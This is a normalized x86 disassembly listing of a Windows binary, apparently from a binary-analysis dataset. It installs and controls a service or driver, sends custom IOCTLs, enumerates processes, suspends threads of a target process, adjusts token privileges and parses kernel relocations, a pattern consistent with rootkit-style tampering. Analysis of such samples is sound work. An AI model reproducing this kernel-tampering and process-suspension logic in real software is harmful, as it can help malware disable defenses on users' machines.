mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ esp + 0x34 ]
push 0x0
mov edi [ esp + 0x3c ]
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push 0x1
push 0x3
push 0x1
push 0xf01ff
push edi
push edi
push eax
call [ CreateServiceA@IAT ]
mov ebx [ GetLastError@IAT ]
mov ebp [ SetLastError@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push 0x0
push 0x0
push esi
call [ StartServiceA@IAT ]
test eax eax
jne r-xdata
call ebx
mov esi eax
push esi
call ebp
cmp esi 0x431
jne r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push esi
call [ QueryServiceStatus@IAT ]
test eax eax
jne r-xdata
call ebx
mov edi eax
push edi
call ebp
cmp edi 0x420
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
push 0xf01ff
push edi
mov edi [ esp + 0x18 ]
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ebp [ GetTickCount@IAT ]
call ebp
mov edi [ esp + 0x28 ]
mov ebx eax
cmp [ esp + 0x18 ] 0x2
jne r-xdata
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
mov edx [ esp + 0x10 ]
push edx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x10 ]
mov edi [ CloseServiceHandle@IAT ]
push eax
call edi
push esi
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
push edi
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
mov ecx [ esp + 0x10 ]
push ecx
call esi
mov ecx [ esp + 0x18 ]
xor eax eax
pop edi
cmp ecx 0x4
pop esi
pop ebp
sete al
pop ebx
add esp 0x20
retn
mov eax 0xcccccccd
mul [ esp + 0x2c ]
shr edx 0x3
cmp edx 0x3e8
jae r-xdata
cmp edx 0x2710
jbe r-xdata
mov edx 0x3e8
jmp r-xdata
push edx
call [ Sleep@IAT ]
lea eax [ esp + 0x14 ]
push eax
push esi
call [ QueryServiceStatus@IAT ]
test eax eax
je r-xdata
mov edx 0x2710
cmp [ esp + 0x28 ] edi
jbe r-xdata
call ebp
mov ecx [ esp + 0x2c ]
sub eax ebx
cmp eax ecx
ja r-xdata
call ebp
mov edi [ esp + 0x28 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x18 ] 0x2
je r-xdata
sub_409c50
sub esp 0x1c
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x28 ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
add esp 0x1c
retn
lea ecx [ esp + 0x8 ]
push ecx
push 0x1
push esi
call [ ControlService@IAT ]
push esi
call [ DeleteService@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x1c
retn
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x1c
retn
sub_409cd0
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0xc ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
retn
push 0x0
push 0x0
push esi
call [ StartServiceA@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
jne r-xdata
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
retn
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
retn
call esi
push edi
call esi
pop edi
xor eax eax
pop esi
retn
sub_409d40
sub esp 0x1c
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x28 ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
add esp 0x1c
retn
lea ecx [ esp + 0x8 ]
push ecx
push 0x1
push esi
call [ ControlService@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x1c
retn
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x1c
retn
sub_409db0
sub esp 0x3c0
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x2c0 ]
push ebx
push esi
push edi
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x2d0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x3d4 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_409240
add esp 0x8
mov ebx [ CreateFileA@IAT ]
lea ecx [ esp + 0x2cc ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0xc0000000
push ecx
call ebx
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x3c0
retn
push ebp
lea edx [ esp + 0x50 ]
push 0x80
push edx
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0x250 ]
push rw-data
push eax
call sub_409240
or ecx 0xffffffff
lea edi [ esp + 0x258 ]
xor eax eax
lea edx [ esp + 0x58 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x158 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x158 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_409d40
add esp 0xc
test eax eax
pop ebp
je r-xdata
xor eax eax
mov esi [ CopyFileA@IAT ]
lea ecx [ esp + 0x14c ]
push 0x0
lea edx [ esp + 0x50 ]
push ecx
push edx
call esi
mov ecx [ esp + 0x3d4 ]
lea eax [ esp + 0x4c ]
push 0x0
push eax
push ecx
call esi
lea edx [ esp + 0xc ]
push edx
call sub_409cd0
add esp 0x4
lea ecx [ esp + 0x14c ]
test eax eax
lea eax [ esp + 0x4c ]
push 0x0
push eax
push ecx
jne r-xdata
call esi
lea edx [ esp + 0x14c ]
push edx
call [ DeleteFileA@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
lea eax [ esp + 0x2e0 ]
push 0xc0000000
push eax
call ebx
cmp eax 0xffffffff
jne r-xdata
call esi
lea edx [ esp + 0x14c ]
push edx
call [ DeleteFileA@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x3c0
retn
lea ecx [ esp + 0xc ]
push ecx
call sub_409d40
lea edx [ esp + 0x10 ]
push edx
call sub_409cd0
add esp 0x8
sub_409fd0
mov eax [ esp + 0x4 ]
sub esp 0x80
test eax eax
je r-xdata
add esp 0x80
retn
push eax
call [ CloseHandle@IAT ]
lea eax [ esp ]
push rw-data
push eax
call sub_409240
mov eax [ esp + 0x90 ]
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp ]
push ecx
push eax
jmp r-xdata
call sub_409d40
add esp 0x4
lea edx [ esp ]
push edx
call sub_409cd0
add esp 0x4
sub_40a030
sub esp 0x100
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push ebp
push esi
push edi
mov edi rw-data
mov ebx [ esp + 0x114 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
push 0x3
and ecx 0x3
push eax
push eax
lea eax [ esp + 0x24 ]
[ edi ] [ esi ]
mov esi [ CreateFileA@IAT ]
push 0xc0000000
push eax
call esi
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x100
retn
mov edi [ esp + 0x118 ]
push ebx
push edi
call sub_409aa0
add esp 0x8
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
lea ecx [ esp + 0x24 ]
push 0xc0000000
push ecx
call esi
cmp eax 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x2
jne r-xdata
push ebx
call sub_409c50
add esp 0x4
push ebx
call sub_409c50
push ebx
push edi
call sub_409aa0
add esp 0xc
test eax eax
je r-xdata
xor eax eax
sub_40a140
sub esp 0x30
push ebx
push esi
lea eax [ esp + 0x14 ]
push edi
push eax
call sub_40a9a0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x28 ]
mov esi [ GetCurrentThreadId@IAT ]
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x24 ]
add esp 0x4
mov [ esp + 0x30 ] edx
mov [ esp + 0x38 ] eax
mov [ esp + 0x34 ] ecx
call esi
mov edi [ esp + 0x40 ]
lea edx [ esp + 0xc ]
mov ebx [ DeviceIoControl@IAT ]
push 0x0
push edx
mov [ esp + 0x30 ] eax
push 0x0
push 0x0
lea eax [ esp + 0x38 ]
push 0x14
push eax
push 0x22e660
push edi
call ebx
mov [ esp + 0x14 ] 0x1
call esi
lea ecx [ esp + 0xc ]
push 0x0
push ecx
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push 0x8
push edx
push 0x22e65c
push edi
mov [ esp + 0x30 ] eax
call ebx
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn
sub_40a1e0
sub esp 0xc
mov [ esp + 0x8 ] 0x0
call [ GetCurrentThreadId@IAT ]
mov edx [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
lea eax [ esp ]
push 0x0
push eax
push 0x0
push 0x0
lea ecx [ esp + 0x14 ]
push 0x8
push ecx
push 0x22e65c
push edx
call [ DeviceIoControl@IAT ]
xor eax eax
add esp 0xc
retn
sub_40a220
sub esp 0x84
lea eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call sub_409240
mov esi [ RegOpenKeyExA@IAT ]
add esp 0x8
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x8 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
call sub_409240
add esp 0x8
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push edx
push 0x20019
push 0x0
push eax
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov ax 0x5
pop esi
add esp 0x84
retn
lea edx [ esp + 0x8 ]
push rw-data
push edx
call sub_409240
add esp 0x8
lea eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
push eax
push 0x20019
push 0x0
push ecx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
push ecx
call [ RegCloseKey@IAT ]
mov ax 0x6
pop esi
add esp 0x84
retn
lea eax [ esp + 0x8 ]
push rw-data
push eax
call sub_409240
add esp 0x8
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x8 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov edx [ esp + 0x4 ]
push edx
call [ RegCloseKey@IAT ]
mov ax 0x7
pop esi
add esp 0x84
retn
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
call sub_409240
add esp 0x8
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push edx
push 0x20019
push 0x0
push eax
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov ax 0x8
pop esi
add esp 0x84
retn
xor ax ax
pop esi
add esp 0x84
retn
mov ecx [ esp + 0x4 ]
push ecx
call [ RegCloseKey@IAT ]
mov ax 0x64
pop esi
add esp 0x84
retn
sub_40a3a0
sub esp 0x84
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_409240
add esp 0x8
lea ecx [ esp ]
lea edx [ esp + 0x4 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x84
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x84
retn
sub_40a400
sub esp 0x84
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_409240
add esp 0x8
lea ecx [ esp ]
lea edx [ esp + 0x4 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x84
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x84
retn
sub_40a460
sub esp 0x84
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_409240
add esp 0x8
lea ecx [ esp ]
lea edx [ esp + 0x4 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x84
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x84
retn
sub_40a4c0
sub esp 0x84
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_409240
add esp 0x8
lea ecx [ esp ]
lea edx [ esp + 0x4 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x84
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x84
retn
sub_40a520
sub esp 0x128
push ebx
push esi
mov esi [ esp + 0x140 ]
push edi
xor eax eax
mov ecx 0x49
lea edi [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
push eax
push 0x2
[ edi ]
mov [ esi ] eax
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
lea eax [ esp + 0xc ]
push ebp
push eax
push ebx
mov [ esp + 0x18 ] 0x128
call Process32First
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x128
retn
push ebx
call [ CloseHandle@IAT ]
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x128
retn
mov eax [ esp + 0x13c ]
mov ebp [ esp + 0x144 ]
mov edi [ esp + 0x140 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x13c ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
call sub_4035e0
add esp 0x8
test eax eax
je r-xdata
cmp [ esi ] ebp
jae r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebx
call Process32Next
test eax eax
jne r-xdata
cmp [ esi ] ebp
jae r-xdata
mov ecx [ esi ]
lea edx [ esp + 0x10 ]
add ecx 0x4
push edx
push ebx
mov [ esi ] ecx
call Process32Next
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov [ edi ] ecx
add edi 0x4
add [ esi ] 0x4
mov edx [ esp + 0x18 ]
mov [ edi ] edx
add edi 0x4
jmp r-xdata
sub_40a610
sub esp 0x34
push ebp
push edi
call sub_40acb0
mov edi eax
test edi edi
mov [ esp + 0x18 ] edi
jne r-xdata
push 0x1
push edi
call sub_40adb0
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push eax
push 0x4
push ecx
push rw-data
call sub_40a520
mov eax [ esp + 0x2c ]
add esp 0x18
cmp eax 0x4
jae r-xdata
pop edi
pop ebp
add esp 0x34
retn
mov edx [ esp + 0xc ]
push edx
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
pop edi
xor eax eax
pop ebp
add esp 0x34
retn
push esi
push 0x4
push 0x1000
push 0x64000
push 0x0
call [ VirtualAlloc@IAT ]
mov esi eax
lea eax [ esp + 0x20 ]
push eax
push 0x64000
push esi
push 0x10
call sub_40ab50
mov eax [ esi ]
test eax eax
jle r-xdata
pop edi
pop ebp
add esp 0x34
retn
push edi
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax 0x1
pop ebp
add esp 0x34
retn
push ebx
mov ebx [ GetCurrentProcess@IAT ]
lea edi [ esi + 0xa ]
mov esi [ esp + 0x4c ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x18 ]
add edi 0x10
dec eax
mov [ esp + 0x18 ] eax
jne r-xdata
cmp [ edi - 0x2 ] 0x6
jne r-xdata
mov ecx [ edi - 0x6 ]
mov eax [ esp + 0x14 ]
cmp ecx eax
jne r-xdata
mov edi [ esp + 0x20 ]
pop ebx
push 0x2
push 0x1
lea edx [ esp + 0x18 ]
push 0x0
push edx
call ebx
push eax
xor eax eax
mov ax [ edi ]
push eax
push ebp
call sub_40ac30
mov edx [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x2c ]
push 0x1c
push ecx
push 0x0
push edx
call sub_40abc0
xor eax eax
test esi esi
jle r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x10 ]
push eax
call [ SuspendThread@IAT ]
inc eax
add ecx 0x4
cmp eax esi
jl r-xdata
cmp edx [ ecx ]
je r-xdata
jmp r-xdata
sub_40a760
sub esp 0x34
push ebp
push edi
call sub_40acb0
mov edi eax
test edi edi
mov [ esp + 0x18 ] edi
jne r-xdata
push 0x1
push edi
call sub_40adb0
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push eax
push 0x4
push ecx
push rw-data
call sub_40a520
mov eax [ esp + 0x2c ]
add esp 0x18
cmp eax 0x4
jae r-xdata
pop edi
pop ebp
add esp 0x34
retn
mov edx [ esp + 0xc ]
push edx
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
pop edi
xor eax eax
pop ebp
add esp 0x34
retn
push esi
push 0x4
push 0x1000
push 0x64000
push 0x0
call [ VirtualAlloc@IAT ]
mov esi eax
lea eax [ esp + 0x20 ]
push eax
push 0x64000
push esi
push 0x10
call sub_40ab50
mov eax [ esi ]
test eax eax
jle r-xdata
pop edi
pop ebp
add esp 0x34
retn
push edi
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax 0x1
pop ebp
add esp 0x34
retn
push ebx
mov ebx [ GetCurrentProcess@IAT ]
lea edi [ esi + 0xa ]
mov esi [ esp + 0x4c ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x18 ]
add edi 0x10
dec eax
mov [ esp + 0x18 ] eax
jne r-xdata
cmp [ edi - 0x2 ] 0x6
jne r-xdata
mov ecx [ edi - 0x6 ]
mov eax [ esp + 0x14 ]
cmp ecx eax
jne r-xdata
mov edi [ esp + 0x20 ]
pop ebx
push 0x2
push 0x1
lea edx [ esp + 0x18 ]
push 0x0
push edx
call ebx
push eax
xor eax eax
mov ax [ edi ]
push eax
push ebp
call sub_40ac30
mov edx [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x2c ]
push 0x1c
push ecx
push 0x0
push edx
call sub_40abc0
xor eax eax
test esi esi
jle r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x10 ]
push eax
call [ ResumeThread@IAT ]
inc eax
add ecx 0x4
cmp eax esi
jl r-xdata
cmp edx [ ecx ]
je r-xdata
jmp r-xdata
sub_40a8b0
sub esp 0x20
push ebx
push ebp
mov ebp [ esp + 0x2c ]
push esi
push edi
push ebp
lea ecx [ esp + 0x24 ]
call sub_40add0
lea ecx [ esp + 0x20 ]
call sub_40ae30
mov esi eax
push 0x5
lea ecx [ esp + 0x24 ]
mov [ esp + 0x1c ] esi
call sub_40ae40
mov edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ esp + 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
test [ esi + 0x16 ] 0x1
jne r-xdata
add eax ebp
test edi edi
mov [ esp + 0x14 ] eax
je r-xdata
mov ecx [ eax + 0x4 ]
xor ebx ebx
mov [ esp + 0x1c ] ecx
lea edx [ eax + 0x8 ]
lea esi [ ecx - 0x8 ]
shr esi 0x1
test esi esi
jle r-xdata
sub edi ecx
add eax ecx
test edi edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] eax
jne r-xdata
mov edi [ eax ]
inc ebx
add edx 0x2
cmp ebx esi
jl r-xdata
mov ecx [ eax + ebp ]
mov ebp [ esp + 0x18 ]
sub ecx [ ebp + 0x34 ]
mov ebp [ esp + 0x38 ]
cmp ecx ebp
mov ebp [ esp + 0x34 ]
jne r-xdata
mov cx [ edx ]
mov eax ecx
and ecx 0xf000
and eax 0xfff
add eax edi
cmp ecx 0x3000
jne r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
cmp [ eax + ebp - 0x2 ] 0x5c7
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ eax + ebp + 0x4 ]
pop edi
pop esi
mov ecx [ edx + 0x34 ]
pop ebp
sub eax ecx
pop ebx
add esp 0x20
retn
sub_40a9a0
sub esp 0x98
push ebx
lea eax [ esp + 0x8 ]
push esi
push eax
lea ecx [ esp + 0xc ]
push 0x4
push ecx
push 0xb
mov [ esp + 0x18 ] 0x0
call sub_40ab50
cmp eax 0xc0000004
jne r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x98
retn
mov edx [ esp + 0xc ]
push edx
call sub_40ec97
mov ecx [ esp + 0x10 ]
add esp 0x4
mov [ esp + 0x8 ] eax
push 0x0
push ecx
push eax
push 0xb
call sub_40ab50
test eax eax
jl r-xdata
mov edx [ esp + 0x8 ]
push edx
call sub_40ecc0
add esp 0x4
mov eax [ esp + 0x8 ]
xor ecx ecx
push 0x1
push 0x0
mov cx [ eax + 0x1e ]
lea eax [ ecx + eax + 0x20 ]
push eax
call [ LoadLibraryExA@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ esp + 0x20 ]
push rw-data
push eax
call sub_409240
add esp 0x8
lea ecx [ esp + 0x20 ]
push ecx
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
sub eax esi
push eax
push esi
call sub_40a8b0
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
push edi
push esi
lea ecx [ esp + 0x18 ]
call sub_40add0
lea ecx [ esp + 0x14 ]
call sub_40ae30
mov edi [ eax + 0x34 ]
lea ecx [ esp + 0x14 ]
call sub_40ae30
mov eax [ eax + 0x50 ]
add esi ebx
mov ecx esi
xor edx edx
mov ebx [ ecx ]
sub ebx edi
cmp ebx eax
jae r-xdata
mov eax [ esp + 0x8 ]
push eax
call sub_40ecc0
add esp 0x4
xor eax eax
pop esi
pop ebx
add esp 0x98
retn
mov eax [ esp + 0xa8 ]
mov ecx [ esp + 0xc ]
mov [ eax + 0x8 ] esi
mov [ eax ] edi
mov ecx [ ecx + 0xc ]
pop edi
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] edx
pop esi
xor eax eax
pop ebx
add esp 0x98
retn
mov ebx [ ecx + 0x4 ]
add ecx 0x4
sub ebx edi
inc edx
cmp ebx eax
jb r-xdata
sub_40aaf0
sub esp 0x80
lea eax [ esp ]
push rw-data
push eax
call sub_409240
add esp 0x8
lea ecx [ esp ]
push ecx
call [ GetModuleHandleA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x84 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
add esp 0x80
retn
lea edx [ esp ]
push edx
call [ LoadLibraryA@IAT ]
test eax eax
jne r-xdata
add esp 0x80
retn
sub_40ab50
mov eax [ rw-data ]
sub esp 0x80
test eax eax
jne r-xdata
mov edx [ esp + 0x90 ]
mov ecx [ esp + 0x8c ]
push edx
mov edx [ esp + 0x8c ]
push ecx
mov ecx [ esp + 0x8c ]
push edx
push ecx
call eax
add esp 0x80
retn 0x10
lea eax [ esp ]
push rw-data
push eax
call sub_409240
lea ecx [ esp + 0x8 ]
push ecx
call sub_40aaf0
add esp 0xc
mov [ rw-data ] eax
test eax eax
jne r-xdata
add esp 0x80
retn 0x10
sub_40abc0
mov eax [ rw-data ]
sub esp 0x80
test eax eax
jne r-xdata
mov edx [ esp + 0x94 ]
mov ecx [ esp + 0x90 ]
push edx
mov edx [ esp + 0x90 ]
push ecx
mov ecx [ esp + 0x90 ]
push edx
mov edx [ esp + 0x90 ]
push ecx
push edx
call eax
add esp 0x80
retn 0x14
lea eax [ esp ]
push rw-data
push eax
call sub_409240
lea ecx [ esp + 0x8 ]
push ecx
call sub_40aaf0
add esp 0xc
mov [ rw-data ] eax
test eax eax
jne r-xdata
add esp 0x80
retn 0x14
sub_40ac30
mov eax [ rw-data ]
sub esp 0x80
test eax eax
jne r-xdata
mov edx [ esp + 0x9c ]
mov ecx [ esp + 0x98 ]
push edx
mov edx [ esp + 0x98 ]
push ecx
mov ecx [ esp + 0x98 ]
push edx
mov edx [ esp + 0x98 ]
push ecx
mov ecx [ esp + 0x98 ]
push edx
mov edx [ esp + 0x98 ]
push ecx
push edx
call eax
add esp 0x80
retn 0x1c
lea eax [ esp ]
push rw-data
push eax
call sub_409240
lea ecx [ esp + 0x8 ]
push ecx
call sub_40aaf0
add esp 0xc
mov [ rw-data ] eax
test eax eax
jne r-xdata
add esp 0x80
retn 0x1c
sub_40acb0
push ecx
lea eax [ esp ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov ecx [ esp ]
neg eax
sbb eax eax
and eax ecx
pop ecx
retn
sub_40ace0
sub esp 0x2c
mov ecx [ esp + 0x34 ]
push ebx
push esi
lea eax [ esp + 0xc ]
push edi
push eax
push ecx
push 0x0
mov [ esp + 0x18 ] 0x10
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov esi [ esp + 0x3c ]
mov edi [ AdjustTokenPrivileges@IAT ]
mov [ esp + 0x2c ] edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x18 ]
mov [ esp + 0x30 ] eax
push ecx
push edx
lea eax [ esp + 0x30 ]
push 0x10
push eax
push 0x0
push esi
mov [ esp + 0x40 ] 0x1
mov [ esp + 0x4c ] 0x0
call edi
mov ebx [ GetLastError@IAT ]
call ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] 0x1
test eax eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x2c
retn
and al 0xfd
or al 0x2
jmp r-xdata
mov [ esp + 0x24 ] eax
mov eax [ esp + 0xc ]
push 0x0
push 0x0
lea ecx [ esp + 0x20 ]
push eax
push ecx
push 0x0
push esi
call edi
call ebx
neg eax
sbb eax eax
pop edi
pop esi
inc eax
pop ebx
add esp 0x2c
retn
sub_40add0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
cmp [ ecx ] 0x5a4d
je r-xdata
mov edx [ ecx + 0x3c ]
add ecx edx
mov [ eax + 0x8 ] ecx
cmp [ ecx ] 0x4550
je r-xdata
lea eax [ esp + 0x4 ]
push r--data
push eax
mov [ esp + 0xc ] 0x57
call sub_40cf90
add ecx 0xf8
mov [ eax + 0xc ] ecx
retn 0x4
lea eax [ esp + 0x4 ]
push r--data
push eax
mov [ esp + 0xc ] 0x57
call sub_40cf90
sub_40ae50
push ecx
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push eax
push 0x0
push 0x3a
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x40
push 0x1000
push 0x1000
